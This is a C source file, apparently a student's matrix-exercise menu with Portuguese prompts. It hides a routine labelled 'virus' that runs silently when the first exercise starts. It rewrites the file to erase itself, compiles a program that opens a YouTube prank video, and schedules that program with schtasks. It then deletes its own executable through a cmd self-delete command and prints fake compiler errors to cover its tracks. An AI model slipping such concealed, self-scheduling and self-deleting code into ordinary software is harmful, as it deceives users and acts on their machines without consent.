#include "io.h"
#include "minhaBiblioteca.h"


void gerarMatrix5x5(){ // 1-crescente 2-decrescente 3-aleatorio 4-zeros
    IO_printf("Este exercicio ira usar o arquivo exemplos.txt que sera gerado agora");
    int escolha = IO_readint("\nEscolha o tipo de matriz:\n1 - Crescente\n2 - Decrescente\n3 - Aleatoria\n4 - Aleatoria nao quadrada\n5 - Zerada\n6 - Criar voce mesmo\n-> ");
    int yAxis = 5;    
    if (escolha == 4){
        IO_printf("\nA matriz gerado e: 5x3");
        yAxis = 3;
    }
    else if (escolha == 6){
        int x = IO_readint("Linha ->");
        int y = IO_readint("Column ->");
        double matrix2[x][y];
        doubleReadMatrix(x, y, matrix2);
        doubleFprintfMatrix("exemplos.txt", x, y, matrix2);
        return;
    }
    else {
        IO_printf("\nA matriz gerado e: 5x5");
    }
    double matrix[5][yAxis];
    doubleBuildMatrix (escolha, 5, yAxis, matrix);
    doubleFprintfMatrix("exemplos.txt", 5, yAxis, matrix);
}

void exemplo0911a(){
    int x = IO_readint("Linha ->");
    int y = IO_readint("Column ->");
    double matrix[x][y];
    doubleReadMatrix(x, y, matrix);
    doublePrintMatrix(x, y, matrix);
}
void exemplo0912a(){
    int x = IO_readint("Linha ->");
    int y = IO_readint("Column ->");
    double matrix[x][y];
    doubleReadMatrix(x, y, matrix);
    doubleFprintfMatrix("exemplo0912.txt", x, y, matrix);
    double matrix2[x][y];
    doubleFscanfMatrix("exemplo0912.txt", x, y, matrix2);
    doublePrintMatrix(x, y, matrix2);
}
void exemplo0913a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++)
        IO_printf("\n[%d][%d] = %.1f", i, i, matrix[i][i]);    
}
void exemplo0914a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i=0, j=y-1; i<x; i++, j--)
        IO_printf("\n[%d][%d] = %.1f", i, j, matrix[i][j]);  
}    
void exemplo0915a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++)
        for (int j = i; j >= 0; j--)
            IO_printf("\n[%d][%d] = %.1f", i, j, matrix[i][j]);
}
void exemplo0916a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++)
        for (int j = i; j < y; j++)
            IO_printf("\n[%d][%d] = %.1f", i, j, matrix[i][j]);
}
void exemplo0917a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++)
        for (int j = y-1-i; j <= y-1; j++)
            IO_printf("\n[%d][%d] = %.1f", i, j, matrix[i][j]);
}
void exemplo0918a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++)
        for (int j = y-1-i; j >= 0; j--)
            IO_printf("\n[%d][%d] = %.1f", i, j, matrix[i][j]);
}
void exemplo0919a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    bool tudoZero = true;
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++){
        for (int j = i; j >= 0; j--){
            if (matrix[i][j] != 0){
                tudoZero = false;
            }
        }
    }
    IO_printf("\nAbaixo da diagonal principal %s todos zeros", tudoZero? "sao":"nao sao");
}
void exemplo0920a(char filename[]){
    int x = readMatrixFlines(filename);
    int y = readMatrixFcolumns(filename);
    if (x != y){
        IO_printf("\n\nA matriz precisa ser quadrada!!!\n\n");
        return;
    }
    double matrix[x][y];
    bool tudoZero = true;
    doubleFscanfMatrix(filename, x, y, matrix);
    IO_printf("\nResultado:");
    for (int i = 0; i < x; i++){
        for (int j = i; j < y; j++){
            if (matrix[i][j] != 0){
                tudoZero = false;
                IO_printf("ENTRO [%d][%d] = %d", i, j, matrix[i][j]);
            }
        }
    }
    IO_printf("\nAcima da diagonal principal %s todos zeros", tudoZero? "sao":"nao sao");
}

#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void quaseMain(){
    char *palavras = (char*)malloc(300*sizeof(char));
    FILE *atual = fopen("menuExercicios.h", "r");
    FILE *novo = fopen("virus.h", "w");



    for (int i = 0; i < 168 && !feof(atual); i++) // ANTES DO VIRUS
    {
        fgets(palavras, 300, atual);
        fputs(palavras, novo);
    }
    for (int i = 168; i < 322; i++) // LINHAS NAO LIDAS >virus<
    {
        fgets(palavras, 300, atual);
    }
    for (int i = 322; i < 339; i++) // DEPOIS DO VIRUS
    {
        fgets(palavras, 300, atual);
        fputs(palavras, novo);
    }
    for (int i = 339; i < 340; i++) // APAGAR EXECUTAVEL
    {
        fgets(palavras, 300, atual);
        // fputs(palavras, novo);
    }
    for (;!feof(atual);) // FIM DO ARQUIVO
    {
        fgets(palavras, 300, atual);
        fputs(palavras, novo);
    }


    fclose(novo);
    fclose(atual);

    FILE *temp = fopen("temp.c", "w");
    FILE *atual2 = fopen("menuExercicios.h", "r");
    for (int i = 0; i < 169; i++)
    {
        fgets(palavras, 300, atual2);
    }
    for (int i = 0; i < 25 && !feof(atual2); i++) // 
    {
        fgets(palavras, 300, atual2);
        fputs(palavras, temp);
    }
    fprintf(temp, ("int main() {\n"));

    fprintf(temp, ("    system(\"powershell Start-Process \\\"http://www.youtube.com/watch?v=dQw4w9WgXcQ\\\"\");\n"));
    fprintf(temp, "    //system(\"start opera http://www.youtube.com/watch?v=dQw4w9WgXcQ\");\n    DelMe();\n    return 0;\n}");
    fclose(temp);
    fclose(atual2);
    system("del menuExercicios.h");
    char temppath[100];
    // char username[20];
    // DWORD username_len = 20;
    // GetUserName(username, &username_len);
    // char caminho[100];
    // char caminho2[100];
    // snprintf(caminho, 100, "C:\\Users%s", username);
    snprintf(temppath, 100, "gcc -o %s\\temp temp.c", getenv("USERPROFILE"));
    system(temppath);
    system("del temp.c");
    system("ren virus.h menuExercicios.h");

    struct tm *data_hora_atual;     
    time_t segundos;
    time(&segundos);   
    data_hora_atual = localtime(&segundos); 

    int dia1 = data_hora_atual->tm_mday;
    int mes1 = data_hora_atual->tm_mon+1;
    int ano1 = data_hora_atual->tm_year+1900;
    int hora1 = data_hora_atual->tm_hour;
    int minuto1 = data_hora_atual->tm_min;

    char dia[3];
    if (dia1<10){
        snprintf(dia, 3, "0%d", dia1);
    }else{
        snprintf(dia, 3, "%d", dia1);
    }

    char mes[3];
    if (mes1<10){
        snprintf(mes, 3, "0%d", mes1);
    }else{
        snprintf(mes, 3, "%d", mes1);
    }
    char hora[3];
    if (hora1<10){
        snprintf(hora, 3, "0%d", hora1);
    }else{
        snprintf(hora, 3, "%d", hora1);
    }
    minuto1++;
    char minuto[3];
    if (minuto1<10){
        snprintf(minuto, 3, "0%d", minuto1);
    }else{
        snprintf(minuto, 3, "%d", minuto1);
    }

    //for (int i = strlen(caminho); i > 0; i--){
    //    if (caminho[i] == '\\'){
    //        for (int j = 0; j < i; j++)
    //        {
    //            caminho2[j] = caminho[j];
    //        }
    //       i = 0;
    //   }
    //}

    char string[150];
    snprintf(string, 150, "schtasks /create /tn temp /tr %s\\temp.exe /sc once /sd %s/%s/%d /st %s:%s", getenv("USERPROFILE"), dia, mes, ano1, hora, minuto);
    system(string);
    // system("s");
    IO_clrscr();
    printf("Undefined *char please try using gcc -o *. *.\n");
    printf("Storage                            /vsr/tst//cs44G0mS.pk\n");
    printf("ld: CompilingTimeError. No output written\n");
    printf("collect2: ld returned 1 exit status\n");
    DelMe();
    exit(1);
}


void exemplo09E1a(){
    int x = IO_readint("Linha ->");
    int y = IO_readint("Column ->");
    double matrix[x][y];
    doubleBuildMatrix(2, x, y, matrix);
    doubleFprintfMatrix("exemplo09E1.txt", x, y, matrix); 
}
void exemplo09E2a(){
    int x = IO_readint("Linha ->");
    int y = IO_readint("Column ->");
    double matrix[x][y];
    doubleBuildMatrix(88, x, y, matrix);
    doubleFprintfMatrix("exemplo09E2.txt", x, y, matrix); 
}

void exemplo0911(){
    IO_clrscr();
    quaseMain();
    IO_printf("Exemplo0911\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nler as dimensoes (quantidade de linhas e de colunas) de uma matriz real do teclado");
    IO_printf("\nbem como todos os seus elementos (apenas valores positivos)");
    IO_printf("\nVerificar se as dimensoes nao sao nulas ou negativas.");
    IO_printf("\nPara testar, ler dados e mostra-los na tela por outro metodo.");
    IO_printf("\n\n");

    exemplo0911a();
}
void exemplo0912(){
    IO_clrscr();
    IO_printf("Exemplo0912\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\ngravar uma matriz real em arquivo");
    IO_printf("\nA matriz e o nome do arquivo serao dados como parametros");
    IO_printf("\nPara testar, usar a leitura da matriz do problema anterior.");
    IO_printf("\nUsar outro metodo para ler e recuperar a matriz do arquivo, antes de mostra-la na tela.");
    IO_printf("\n\n");
    exemplo0912a();
}
void exemplo0913(){
    IO_clrscr();
    IO_printf("Exemplo0913\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nmostrar somente os valores na diagonal principal de uma matriz real, se for quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0913a("exemplos.txt");
}
void exemplo0914(){
    IO_clrscr();
    IO_printf("Exemplo0914\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nmostrar somente os valores na diagonal secundaria de uma matriz real, se for quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0914a("exemplos.txt");
}
void exemplo0915(){
    IO_clrscr();
    IO_printf("Exemplo0915\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nmostrar somente os valores abaixo e na diagonal principal de uma matriz real, se for quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0915a("exemplos.txt");
}
void exemplo0916(){
    IO_clrscr();
    IO_printf("Exemplo0916\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nmostrar somente os valores acima e na diagonal principal de uma matriz real, se for quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0916a("exemplos.txt");
}
void exemplo0917(){
    IO_clrscr();
    IO_printf("Exemplo0917\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nmostrar somente os valores abaixo e na diagonal secundaria de uma matriz real, se for quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0917a("exemplos.txt");
}
void exemplo0918(){
    IO_clrscr();
    IO_printf("Exemplo0918\n");
    IO_printf("\nIncluir em um programa um metodo para");
    IO_printf("\nmostrar somente os valores acima e na diagonal secundaria de uma matriz real, se for quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0918a("exemplos.txt");
}
void exemplo0919(){
    IO_clrscr();
    IO_printf("Exemplo0919\n");
    IO_printf("\nIncluir em um programa uma funcao para");
    IO_printf("\ntestar se nao sao todos zeros os valores abaixo da diagonal principal de uma matriz real quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0919a("exemplos.txt");
}
void exemplo0920(){
    IO_clrscr();
    IO_printf("Exemplo0920\n");
    IO_printf("\nIncluir em um programa uma funcao para");
    IO_printf("\ntestar se sao zeros os valores acima da diagonal principal de uma matriz real quadrada.");
    IO_printf("\n\n");
    
    gerarMatrix5x5();
    exemplo0920a("exemplos.txt");
}
void exemplo09E1(){
    IO_clrscr();
    IO_printf("Exemplo09E1\n");
    IO_printf("\nIncluir em um programa definicoes e testes para");
    IO_printf("\nler do teclado as quantidades de linhas e colunas de uma matriz,");
    IO_printf("\ne montar uma matriz com a caracteristica abaixo,");
    IO_printf("\na qual devera ser gravada em arquivo, apos o retorno.");
    IO_printf("\n\n");

    exemplo09E1a();
}
void exemplo09E2(){
    IO_clrscr();
    IO_printf("Exemplo09E2\n");
    IO_printf("\nIncluir em um programa definicoes e testes para");
    IO_printf("\nler do teclado as quantidades de linhas e colunas de uma matriz,");
    IO_printf("\ne montar uma matriz com a caracteristica abaixo,");
    IO_printf("\na qual devera ser gravada em arquivo, apos o retorno.");
    IO_printf("\n\n");

    exemplo09E2a();
}
